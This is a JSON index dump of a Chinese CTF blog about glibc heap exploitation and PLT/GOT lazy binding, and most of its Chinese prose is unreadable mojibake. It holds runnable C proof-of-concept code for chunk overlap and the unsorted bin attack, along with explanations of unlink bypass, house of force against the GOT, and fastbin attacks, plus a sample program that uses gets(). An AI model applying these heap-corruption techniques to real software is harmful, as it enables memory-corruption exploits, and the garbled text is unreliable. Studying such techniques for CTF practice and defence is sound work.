è¿™æ—¶æˆ‘ä»¬æŠŠp1çš„sizeä½æ”¹å˜å†è¿›è¡Œé‡Šæ”¾ï¼Œå°±ä¼šè¿›å…¥fastbinä¸­ ç»§ç»­åˆ†é…æˆ‘ä»¬å°±å¯ä»¥æŠŠp2çš„æ•°æ®æ”¹å˜ fastbinå¦‚æˆ‘ä»¬æ‰€æ–™ æ¼”ç¤ºå®Œæˆ è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥æ”¹å˜p2çš„æ•°æ® 4.æ¼”ç¤º2ï¼ˆsmallbinï¼‰1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; void *ptr,*ptr1; ptr=malloc(0x80);//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1 malloc(0x10); //åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2 malloc(0x10); //é˜²æ­¢ä¸top chunkåˆå¹¶ *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0);&#125; ç›´æ¥æ–­ç‚¹ ä¿®æ”¹sizeå€¼ä¹‹å é‡Šæ”¾ è¿›å…¥unsortedbinä¸­ ç»§ç»­åˆ†é… æˆ‘ä»¬è¿™æ ·å°±å¯ä»¥ç›´æ¥ä¿®æ”¹æ•°æ®äº† 5.æ¼”ç¤º3ï¼ˆå‘å‰overlapï¼‰1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//é˜²æ­¢ä¸topåˆå¹¶ free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//ä¿®æ”¹pre_inuseåŸŸ *(int *)((long long)ptr4-0x10)=0xd0;//ä¿®æ”¹pre_sizeåŸŸ free(ptr4);//unlinkè¿›è¡Œå‰å‘extend malloc(0x150);//å ä½å—&#125; æ–­ç‚¹ ä¿®æ”¹æŒ‡é’ˆå æ­¤æ—¶é‡Šæ”¾p4 è¿›å…¥unsortedbinä¸­ å¦‚æœè¿›è¡Œåˆ†é… é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å‘å‰overlap æˆ‘ä»¬æœ€åæ¥åˆ†é…ä¸€ä¸‹ 0x05 unlink1.æ¦‚å¿µ åŒå‘é“¾è¡¨ä¸­ç§»é™¤/æ·»åŠ ä¸€ä¸ªchunkæ—¶ï¼Œä¼šå‘ç”Ÿæ–­é“¾çš„æ“ä½œï¼Œè¿™ä¸ªæ–­é“¾çš„è¿‡ç¨‹å°±å«åšunlink æ³¨æ„äº‹é¡¹ï¼šunlinkä¸å‘ç”Ÿåœ¨fastbinå’Œsmallbinä¸­ï¼Œæ‰€ä»¥fastbinå’Œsmallbinå®¹æ˜“äº§ç”Ÿæ¼æ´ 2.å‘ç”Ÿåœºæ™¯mallocæ—¶ï¼š ä»æ°å¥½å¤§å°åˆé€‚çš„largebinä¸­è·å–chunkï¼Œå‘ç”Ÿunlink ä»æ¯”mallocè¦æ±‚å¤§çš„largebinä¸­å–chunkï¼Œå‘ç”Ÿunlink freeæ—¶ï¼š freeä¹‹åï¼Œä¸å‰åç©ºé—²çš„chunkè¿›è¡Œåˆå¹¶ malloc consolidateæ—¶ï¼š consolidateæ—¶ï¼Œchunkä¹‹é—´çš„unlink reallocæ—¶ï¼š å‘å‰æ‰©å±•ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—²chunk 3.å¤è€çš„unlinkå…¶ä¸­Pä¸ºéœ€è¦é‡Šæ”¾/æ·»åŠ çš„chunk unlinkçš„ä»£ç  (1)å°†å‰ä¸€ä¸ªchunkå ç”¨çš„å†…å­˜åˆå¹¶åˆ°å½“å‰chunk; (2)ä¿®æ”¹æŒ‡å‘å½“å‰chunkçš„æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘å‰ä¸€ä¸ªchunkã€‚ (3)ä½¿ç”¨unlinkå®ï¼Œå°†å‰ä¸€ä¸ªfree chunkä»åŒå‘å¾ªç¯é“¾è¡¨ä¸­ç§»é™¤ æ­¤ä¾‹æ¥è‡ªctf-wiki ç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶ glibc åˆ¤æ–­è¿™ä¸ªå—æ˜¯ small chunk åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶ åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶ ç»§è€Œå¯¹ Nextchunk é‡‡å– unlink æ“ä½œ é‚£ä¹ˆ unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœæ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ¥åˆ†æä¸€ä¸‹ ä»¥ä¸‹12å’Œ8éƒ½æ˜¯å¯¹äº32ä½æ¥è¯´çš„ FD=P-&gt;fd = target addr -12 BK=P-&gt;bk = expect value FD-&gt;bk = BKï¼Œå³ *(target addr-12+12)=BK=expect value BK-&gt;fd = FDï¼Œå³ *(expect value +8) = FD = target addr-12 è¿™å¼ å›¾ç‰‡åº”è¯¥æ›´å¥½ç†è§£ 4.æ–°çš„unlinkæ–°ç‰ˆçš„unlinkåŠ å…¥äº†ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç  123&#x2F;&#x2F; fd bkif (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ å¦‚æœä¸æŒ‡å‘Pï¼Œé‚£ä¹ˆå°±å‡ºç°äº†é—®é¢˜ é‚£å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬é€šè¿‡è¦†ç›–ï¼Œå°† nextchunk çš„ FD æŒ‡é’ˆæŒ‡å‘äº† fakeFDï¼Œå°† nextchunk çš„ BK æŒ‡é’ˆæŒ‡å‘äº† fakeBK ã€‚é‚£ä¹ˆä¸ºäº†é€šè¿‡éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦ fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ Unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD å¦‚æœè®© fakeFD + 12 å’Œ fakeBK + 8 æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š *P = P - 8 *P = P - 12 å³é€šè¿‡æ­¤æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„ã€‚æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ chunk çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„ã€‚ 5.åˆ©ç”¨æ¡ä»¶ UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk 6.æ•ˆæœä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18 0x06 house of force1.åŸç†æ”»å‡»è€…é€šè¿‡å †æº¢å‡ºæˆ–è€…å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿topchunkçš„åœ°å€è¶…å‡ºæ­£å¸¸çš„å †æ®µçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶åˆ°è¶…å‡ºå †æ®µä¹‹å¤–çš„å†…å­˜ 2.åˆ©ç”¨æ¡ä»¶ â‘ é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ–¹å¼ï¼Œæ§åˆ¶åˆ°topchunkçš„sizeæˆå‘˜ â‘¡å°†topchunkçš„sizeæˆå‘˜å˜ä¸ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè¿™æ ·topchunkå°±ä¼šè¶…å‡ºå†…å­˜ä¸­çš„å †æ®µï¼Œä»è€Œè®¿é—®åˆ°å…¶ä»–æ®µçš„å†…å­˜åœ°å€ï¼ˆgotè¡¨çš„åœ°å€ï¼‰ â‘¢æ­¤æ—¶é€šè¿‡mallocç”³è¯·å†…å­˜çš„æ—¶å€™ï¼Œç”³è¯·çš„å°±æ˜¯gotçš„å†…å­˜åœ°å€ï¼Œå°±å¯ä»¥æ›´æ”¹gotå†…å­˜çš„å†…å®¹ 0x07 fastbin attack Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc å…¶ä¸­ï¼Œå‰ä¸¤ç§ä¸»è¦æ¼æ´ä¾§é‡äºåˆ©ç”¨ free å‡½æ•°é‡Šæ”¾çœŸçš„ chunk æˆ–ä¼ªé€ çš„ chunkï¼Œç„¶åå†æ¬¡ç”³è¯· chunk è¿›è¡Œæ”»å‡»ï¼Œåä¸¤ç§ä¾§é‡äºæ•…æ„ä¿®æ”¹ fd æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨ malloc ç”³è¯·æŒ‡å®šä½ç½® chunk è¿›è¡Œæ”»å‡»ã€‚ 0x08 unsorted bin attack1.æ¦‚å¿µUnsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚ 2.ä½¿ç”¨æƒ…å†µ Unsorted Bin åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯ FIFOï¼Œå³æ’å…¥çš„æ—¶å€™æ’å…¥åˆ° unsorted bin çš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾è¡¨å°¾è·å–ã€‚ åœ¨ç¨‹åº malloc æ—¶ï¼Œå¦‚æœåœ¨ fastbinï¼Œsmall bin ä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„ chunkï¼Œå°±ä¼šå°è¯•ä» Unsorted Bin ä¸­å¯»æ‰¾ chunkã€‚å¦‚æœå–å‡ºæ¥çš„ chunk å¤§å°åˆšå¥½æ»¡è¶³ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº› chunk åˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„ bin ä¸­ã€‚ 3.åŸç†è§£é‡Š unsortedbinæ­£å¸¸å­˜å‚¨freechunkçš„ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼Œæ­¤æ—¶è¿™ä¸ªfreechunkæ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡é’ˆæ“æ§çš„ï¼ˆè™½ç„¶freeäº†ä½†æ²¡æœ‰ç½®ç©ºï¼‰ å¦‚æœåœ¨å–èµ°å †å—ä¹‹å‰ï¼Œæˆ‘ä»¬å°†unsortedbinä¸­çš„chunkçš„bkæŒ‡é’ˆæ”¹ä¸ºæˆ‘ä»¬çš„targetåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ­¤æ—¶æˆ‘ä»¬å»mallocå †å—çš„æ—¶å€™å°±ä¼šå‘ç”Ÿå¦‚ä¸‹ä»£ç  1234/** victim is free chunk **/bck = victim-&gt;bk;unsorted_chunks(av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks(av); åœ¨æˆ‘ä»¬ç§»é™¤victimä¹‹åå°±å˜æˆäº†è¿™æ ·ã€‚æˆ‘ä»¬çš„targetçš„fdçš„å†…å®¹ä¸ºmalloc_stateç»“æ„ä½“çš„unsortedbiné“¾çš„fdæŒ‡é’ˆäº† 4.æ¼”ç¤º123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; fprintf(stderr, \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack\\n\"); fprintf( stderr, \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack\\n\\n\"); unsigned long target_var = 0; fprintf(stderr, \"Let's first look at the target we want to rewrite on stack:\\n\"); fprintf(stderr, \"%p: %ld\\n\\n\", &amp;target_var, target_var); unsigned long *p = malloc(400); fprintf(stderr, \"Now, we allocate first normal chunk on the heap at: %p\\n\", p); fprintf(stderr, \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free()\\n\\n\"); malloc(500); free(p); fprintf(stderr, \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p\\n\", (void *)p[1]); /*------------VULNERABILITY-----------*/ p[1] = (unsigned long)(&amp;target_var - 2); fprintf(stderr, \"Now emulating a vulnerability that can overwrite the \" \"victim-&gt;bk pointer\\n\"); fprintf(stderr, \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p\\n\\n\", (void *)p[1]); //------------------------------------ malloc(400); fprintf(stderr, \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite:\\n\"); fprintf(stderr, \"%p: %p\\n\", &amp;target_var, (void *)target_var);&#125; ç»è¿‡ä¸Šé¢åŸç†çš„è§£é‡Šï¼Œè¿™ä¸ªå°±ä¸è¯´äº† æœ€åæ€»ç»“ä¸€å¥è¯: ä¿®æ”¹ target å¤„çš„å€¼ä¸º unsorted bin çš„é“¾è¡¨å¤´éƒ¨ 0x7f1c705ffb78ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰è¾“å‡ºçš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° unsorted bin attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ã€‚","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"å †","slug":"å †","permalink":"https://pz1o.top/tags/%E5%A0%86/"}]},{"title":"pltè¡¨å’Œgotè¡¨","slug":"pltè¡¨å’Œgotè¡¨","date":"2020-12-16T13:32:03.000Z","updated":"2020-12-17T01:05:53.222Z","comments":true,"path":"2020/12/16/pltè¡¨å’Œgotè¡¨/","link":"","permalink":"https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/","excerpt":"","text":"éœ€è¦å•¥ å­¦å•¥ çœ‹å­¦é•¿åšå®¢å†™äº†è¿™ä¸ª è‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ æ¯•ç«Ÿåˆšå­¦ https://ld1ng.com/2020/06/16/GOTPLT/ https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8 https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8 GOTè¡¨å’ŒPLTè¡¨GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰å’Œ PLT(è¿‡ç¨‹é“¾æ¥è¡¨)ï¼Œæ˜¯ä¸¤ä¸ªè¡¨ä¹‹é—´çš„äº¤äº’æ‰ä½¿å¾—å‡½æ•°å®ç°å»¶è¿Ÿç»‘å®šï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°†è¿‡ç¨‹åœ°å€çš„ç»‘å®šæ¨è¿Ÿåˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚ å¼•å…¥123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt;void win()&#123; printf(\"you win\\n\");&#125;int main()&#123; char a[100]; gets(a); printf(\"you lose\\n\"); return 0;&#125; ç¼–è¯‘è¿™ä¸ªæ–‡ä»¶ gdbè°ƒè¯•ä¸€ä¸‹ æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°gets@pltå’Œputs@pltè¿™ä¸¤ä¸ªå‡½æ•° @pltè¿™é‡Œçš„æ„æ€æ˜¯æŒ‡PLTè¡¨ä¸­çš„æ•°æ®çš„åœ°å€ã€‚ ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒå’Œå†…å­˜CPUçš„åˆ©ç”¨ç‡ï¼Œç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸ºPLTè¡¨ï¼Œä¸€ä¸ªä¸ºGOTè¡¨ï¼ŒPLTè¡¨å¯ä»¥ç§°ä¸ºå†…éƒ¨å‡½æ•°è¡¨ï¼ŒGOTè¡¨ä¸ºå…¨å±€å‡½æ•°è¡¨ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯åŠ¨æ€å‡½æ•°è¡¨è¿™æ˜¯ä¸ªäººè‡ªç§°ï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œä»€ä¹ˆå«åšç›¸å¯¹åº”å‘¢ï¼ŒPLTè¡¨ä¸­çš„æ•°æ®å°±æ˜¯GOTè¡¨ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å®šæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œ è¿™æ—¶ æˆ‘ä»¬ä¹Ÿå°±ç†è§£äº†@pltæ ‡å¿—çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯ä¸ªè¿‡æ¸¡ä½œç”¨ï¼Œå› ä¸ºGOTè¡¨é¡¹ä¸­çš„æ•°æ®æ‰æ˜¯å‡½æ•°æœ€ç»ˆçš„åœ°å€ï¼Œè€ŒPLTè¡¨ä¸­çš„æ•°æ®åˆæ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨æ¥å¾—åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€ã€‚ é‚£@pltå‡½æ•°é‡Œé¢æ˜¯ä»€ä¹ˆå‘¢ 1disass gets jmpæŒ‡ä»¤è·³è½¬åˆ°GOTè¡¨ GOTè¡¨ä¸­çš„æ•°æ®ä¸º0x4004c6 è·³è½¬åˆ°æŒ‡ä»¤åœ°å€ä¸º0x4004c6 æ‰§è¡Œpush 0x3è¿™ä¸ªä¸ºåœ¨GOTä¸­çš„ä¸‹æ ‡åºå· åœ¨æ‰§è¡Œjmp 0x400480 è€Œ0x400480ä¸ºPLT[0]çš„åœ°å€ PLT[0]çš„æŒ‡ä»¤ä¼šè¿›å…¥åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£ æ‰§è¡Œä¸€ä¸ªå‡½æ•°å°†çœŸæ­£çš„å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­ é—®é¢˜1.PLT[0]å¤„åˆ°åº•åšäº†ä»€ä¹ˆï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¹‹å‰çš„æ€è·¯å®ƒä¸æ˜¯åº”è¯¥è·³è½¬åˆ°GOT[0]å— è¿™æ˜¯plt[0]ä¸­çš„å†…å®¹ åé¢çš„16è¿›åˆ¶å°±æ˜¯GOTè¡¨ä¸­çš„å†…å®¹ æˆ‘ä»¬çš„PLT[0]æ ¹æœ¬æ²¡æœ‰è·³è½¬åˆ°GOT[0]ï¼Œå®ƒä¸åƒæˆ‘ä»¬çš„PLT[1]è¿™äº›å­˜å‚¨çš„æ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œå®ƒæ˜¯ä¸€äº›ä»£ç æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å¼ å›¾ è€Œplt[0]ä»£ç åšçš„äº‹æƒ…åˆ™æ˜¯ï¼šç”±äºGOT[2]ä¸­å­˜å‚¨çš„æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£åœ°å€ï¼Œæ‰€ä»¥é€šè¿‡GOT[1]ä¸­çš„æ•°æ®ä½œä¸ºå‚æ•°ï¼Œè·³è½¬åˆ°GOT[2]æ‰€å¯¹åº”çš„å‡½æ•°å…¥å£åœ°å€ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ä¸€ä¸ªå‡½æ•°çš„çœŸæ­£åœ°å€ç»‘å®šåˆ°ç›¸åº”çš„GOT[x]ä¸­ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡PLTè¡¨è°ƒç”¨ï¼Œä¸€ä¸ªåˆ™æ˜¯é€šè¿‡GOTè¡¨è°ƒç”¨ï¼Œå› ä¸ºPLTè¡¨æœ€ç»ˆä¹Ÿæ˜¯è·³è½¬GOTè¡¨ï¼ŒGOTè¡¨ä¸­åˆ™æ˜¯ä¸€ä¸ªå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿è¡Œä¸€æ¬¡ä¹‹å‰ï¼ŒGOTè¡¨ä¸­çš„æ•°æ®ä¸º@pltå‡½æ•°ä¸­ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ 2.ä¸ºä»€ä¹ˆä¸­é—´è¦è¿›è¡Œpushå‹æ ˆæ“ä½œï¼Ÿ ä¸­é—´è¿›è¡Œçš„å‹æ ˆæ˜¯ä¸ºäº†ç¡®å®šPLTå¯¹åº”çš„GOTè¡¨é¡¹ï¼Œå³æ˜¯PLT[1]âˆ’&gt;GOT[3]ï¼Œ0x3å°±æ˜¯GOTçš„ä¸‹æ ‡3ï¼Œä¹Ÿå°±æ˜¯è¯´å‹æ ˆåæˆ‘ä»¬è·³è½¬åˆ°PLT[0],æ¥ç€PLT[0]ä¸­çš„æŒ‡ä»¤ä¼šé€šè¿‡è¿™æ¬¡å‹æ ˆçš„åºå·æ¥ç¡®å®šæ“ä½œçš„GOTè¡¨é¡¹ä¸ºå¤šå°‘ 3.å‹å…¥çš„åºå·ä¸ºä»€ä¹ˆä¸º0x3ï¼Œä¸æ˜¯æœ€å¼€å§‹åº”è¯¥ä¸º0x0å—ï¼Ÿ å› ä¸ºGOT[0],GOT[1],GOT[2]éƒ½æœ‰å…¶ä»–ç”¨å¤„ï¼Œæ‰€ä»¥ä»0x3å¼€å§‹ã€‚ æ€»ç»“GOTè¡¨çš„æ„æˆGOT[0]åŒ…å«.dynamicæ®µçš„åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯; GOT[1]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†; GOT[2]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç çš„å…¥å£ç‚¹ã€‚ GOTçš„å…¶ä»–è¡¨ç›®ä¸ºæœ¬æ¨¡å—è¦å¼•ç”¨çš„ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å‡½æ•°çš„åœ°å€ã€‚ PLTè¡¨çš„æ„æˆPLTè¡¨å¹¶ä¸æ˜¯æ¯ä¸ªè¡¨é¡¹éƒ½ç”¨äºå­˜æ”¾â€œå‡½æ•°åœ°å€â€œï¼Œå…¶ä¸­PLT[0]æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç›®ï¼Œå®ƒè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ä¸­æ‰§è¡Œï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚ å®ç°æœ€åï¼Œè‡ªå·±æ€»ç»“ä¸€ä¸‹å®ç°è¿‡ç¨‹ é¦–å…ˆï¼Œè¿›å…¥PLTè¡¨é¡¹ï¼Œè¿™æ—¶ç¬¬ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°GOTè¡¨é¡¹ GOTè¡¨é¡¹å­˜æ”¾PLTè¡¨ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯push 0x xæŠŠç›¸åº”çš„idxå‹å…¥ ä¸‹ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°PLT[0]ä¸­ï¼Œè¿›è€Œé“¾æ¥åˆ°GOT[2] ,è¿›å…¥é“¾æ¥å™¨å…¥å£ æœ€åé€šè¿‡åŠ¨æ€é“¾æ¥å™¨å°†çœŸæ­£å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­ åˆ«äººçš„åŠ¨å›¾","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"å †","slug":"å †","date":"2020-12-15T08:19:22.000Z","updated":"2020-12-22T13:19:27.950Z","comments":true,"path":"2020/12/15/å †/","link":"","permalink":"https://pz1o.top/2020/12/15/%E5%A0%86/","excerpt":"","text":"å †(æŒç»­æ›´æ–°)https://ld1ng.com/2020/07/23/Heap/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap ä¸Šä¸€ä¸ªPWNå­¦ä¹  å­¦å¾—ä¸å¤ªå…¨é¢ 